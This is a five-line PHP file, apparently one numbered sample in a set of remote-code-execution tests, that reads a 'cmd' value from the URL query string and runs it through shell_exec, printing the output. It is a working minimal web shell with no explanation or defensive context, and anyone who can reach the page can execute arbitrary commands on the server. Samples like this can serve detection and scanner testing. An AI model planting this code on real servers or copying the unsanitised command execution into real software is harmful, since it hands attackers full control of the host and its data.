<?php
// RCE test variation #492
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>